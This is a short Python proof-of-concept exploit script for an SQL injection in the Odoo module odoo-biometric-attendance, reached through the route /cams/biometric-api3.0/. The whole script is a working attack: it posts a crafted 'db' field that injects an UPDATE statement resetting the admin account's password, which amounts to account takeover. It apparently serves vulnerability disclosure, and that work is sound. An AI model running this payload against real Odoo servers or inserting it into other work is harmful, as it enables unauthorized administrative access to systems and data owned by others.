# Exploit
# Copyright (c) 2023 Lucas Visintin
# Odoo Module: odoo-biometric-attendance
# SQL injection vulnerability in odoo-biometric-attendance/controllers/controllers.py::is_db_exist(db_name)
# Triggered from odoo-biometric-attendance/controllers/controllers.py:CamsAttendance::generate_attendance(**params)
# Reachable from route /cams/biometric-api3.0/

import requests

url = 'http://localhost:8069/cams/biometric-api3.0/'

data = {
    "db": "' ;  UPDATE res_users SET password='whatever' WHERE login='admin';  SELECT 0 FROM pg_database where datname='test' -- "
}

response = requests.post(url=url, data=data)
print(response.json())
